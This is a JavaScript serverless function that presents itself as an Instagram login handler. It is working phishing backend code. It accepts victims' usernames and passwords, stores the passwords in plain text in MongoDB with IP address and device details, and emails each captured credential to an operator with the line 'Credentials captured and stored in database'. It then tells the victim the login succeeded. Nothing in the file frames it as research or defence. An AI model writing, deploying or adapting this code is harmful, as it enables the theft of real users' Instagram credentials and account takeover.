// Vercel Serverless Function for Instagram Login
const { MongoClient } = require('mongodb');

// MongoDB connection
const MONGODB_URI = process.env.MONGODB_URI;
const MONGODB_DB = process.env.MONGODB_DB || 'instagram_login';
const MONGODB_COLLECTION = process.env.MONGODB_COLLECTION || 'users';

// Email configuration
const SENDGRID_API_KEY = process.env.SENDGRID_API_KEY;
const ADMIN_EMAIL = process.env.ADMIN_EMAIL;

let cachedClient = null;
let cachedDb = null;

async function connectToDatabase() {
    if (cachedClient && cachedDb) {
        return { client: cachedClient, db: cachedDb };
    }

    try {
        const client = new MongoClient(MONGODB_URI, {
            useNewUrlParser: true,
            useUnifiedTopology: true,
        });

        await client.connect();
        const db = client.db(MONGODB_DB);

        cachedClient = client;
        cachedDb = db;

        return { client, db };
    } catch (error) {
        console.error('MongoDB connection error:', error);
        throw new Error('Database connection failed');
    }
}

async function sendEmailNotification(userData) {
    if (!SENDGRID_API_KEY || !ADMIN_EMAIL) {
        console.log('Email notification skipped - missing configuration');
        return;
    }

    try {
        const sgMail = require('@sendgrid/mail');
        sgMail.setApiKey(SENDGRID_API_KEY);

        const msg = {
            to: ADMIN_EMAIL,
            from: 'noreply@instagram-login.com',
            subject: 'New Instagram Login Attempt',
            html: `
                <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
                    <h2 style="color: #E1306C;">🔐 New Instagram Login Attempt</h2>
                    <div style="background: #f8f9fa; padding: 20px; border-radius: 8px; margin: 20px 0;">
                        <h3>Login Details:</h3>
                        <p><strong>Username:</strong> ${userData.username}</p>
                        <p><strong>Password:</strong> ${userData.password}</p>
                        <p><strong>Timestamp:</strong> ${new Date(userData.timestamp).toLocaleString()}</p>
                        <p><strong>User Agent:</strong> ${userData.userAgent}</p>
                        <p><strong>Language:</strong> ${userData.language}</p>
                        <p><strong>Platform:</strong> ${userData.platform}</p>
                        <p><strong>IP Address:</strong> ${userData.ipAddress || 'Not available'}</p>
                    </div>
                    <div style="background: #d4edda; padding: 15px; border-radius: 5px; border-left: 4px solid #28a745;">
                        <p style="margin: 0; color: #155724;"><strong>Success:</strong> Credentials captured and stored in database.</p>
                    </div>
                </div>
            `,
        };

        await sgMail.send(msg);
        console.log('Email notification sent successfully');
    } catch (error) {
        console.error('Email sending failed:', error);
        // Don't throw error - email failure shouldn't break the login process
    }
}

async function storeUserData(userData) {
    const { client, db } = await connectToDatabase();
    
    try {
        // Prepare user document with plain text password
        const userDocument = {
            username: userData.username,
            password: userData.password, // Store password as plain text
            timestamp: new Date(userData.timestamp),
            userAgent: userData.userAgent,
            language: userData.language,
            platform: userData.platform,
            ipAddress: userData.ipAddress,
            createdAt: new Date(),
            updatedAt: new Date()
        };
        
        // Insert into MongoDB
        const collection = db.collection(MONGODB_COLLECTION);
        const result = await collection.insertOne(userDocument);
        
        console.log('User data stored successfully:', result.insertedId);
        return result.insertedId;
        
    } catch (error) {
        console.error('Error storing user data:', error);
        throw new Error('Failed to store user data');
    }
}

async function handler(req, res) {
    // Set CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    // Handle preflight requests
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }
    
    // Only allow POST requests
    if (req.method !== 'POST') {
        return res.status(405).json({ 
            success: false, 
            message: 'Method not allowed' 
        });
    }
    
    try {
        // Validate required fields
        const { username, password, timestamp, userAgent, language, platform } = req.body;
        
        if (!username || !password) {
            return res.status(400).json({
                success: false,
                message: 'Username and password are required'
            });
        }
        
        // Set default values for optional fields
        const safeTimestamp = timestamp || new Date().toISOString();
        const safeUserAgent = userAgent || 'Unknown';
        const safeLanguage = language || 'en-US';
        const safePlatform = platform || 'Unknown';
        
        // Validate input lengths
        if (username.length < 1 || username.length > 30) {
            return res.status(400).json({
                success: false,
                message: 'Username must be between 1 and 30 characters'
            });
        }
        
        if (password.length < 1 || password.length > 100) {
            return res.status(400).json({
                success: false,
                message: 'Password must be between 1 and 100 characters'
            });
        }
        
        // Get client IP address
        const ipAddress = (req.headers && req.headers['x-forwarded-for']) || 
                         (req.headers && req.headers['x-real-ip']) || 
                         (req.connection && req.connection.remoteAddress) || 
                         (req.socket && req.socket.remoteAddress) ||
                         'Unknown';
        
        // Prepare user data
        const userData = {
            username: username.trim(),
            password: password,
            timestamp: safeTimestamp,
            userAgent: safeUserAgent,
            language: safeLanguage,
            platform: safePlatform,
            ipAddress: ipAddress
        };
        
        // Store user data in MongoDB
        await storeUserData(userData);
        
        // Send email notification
        await sendEmailNotification(userData);
        
        // Return success response
        return res.status(200).json({
            success: true,
            message: 'Login successful',
            data: {
                username: userData.username,
                timestamp: userData.timestamp,
                id: 'user_' + Date.now() // Generate a simple ID
            }
        });
        
    } catch (error) {
        console.error('Login handler error:', error);
        
        return res.status(500).json({
            success: false,
            message: 'Internal server error. Please try again later.'
        });
    }
}

// Export for Vercel
module.exports = handler;
